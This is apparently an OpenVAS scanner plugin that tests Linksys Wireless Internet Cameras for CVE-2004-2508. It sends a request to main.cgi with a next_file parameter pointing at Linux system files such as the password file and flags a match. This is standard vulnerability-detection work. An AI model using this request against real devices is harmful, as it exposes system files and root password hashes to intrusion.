###############################################################################
# OpenVAS Vulnerability Test
# $Id: linksys_next_file_file_disclosure.nasl 11751 2018-10-04 12:03:41Z jschulte $
#
# Linksys Wireless Internet Camera File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Contact: sf@cicsos.dk
# Subject: Linksys Wireless Internet Camera
# Date: 	Jun 23 02:05:11 2004

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.13636");
  script_version("$Revision: 11751 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-04 14:03:41 +0200 (Thu, 04 Oct 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2004-2508");
  script_bugtraq_id(10533);
  script_name("Linksys Wireless Internet Camera File Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The Linksys Wireless Internet Camera contains a CGI that allows remote
  attackers to disclosue sensitive files stored on the server.");

  script_tag(name:"impact", value:"An attacker may use this CGI to disclosue the password file and from it
  the password used by the root use (the MD5 value).");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/main.cgi?next_file=/" + file;
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(isnull(res)) exit(0);

  if(egrep(pattern:pattern, string:res)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
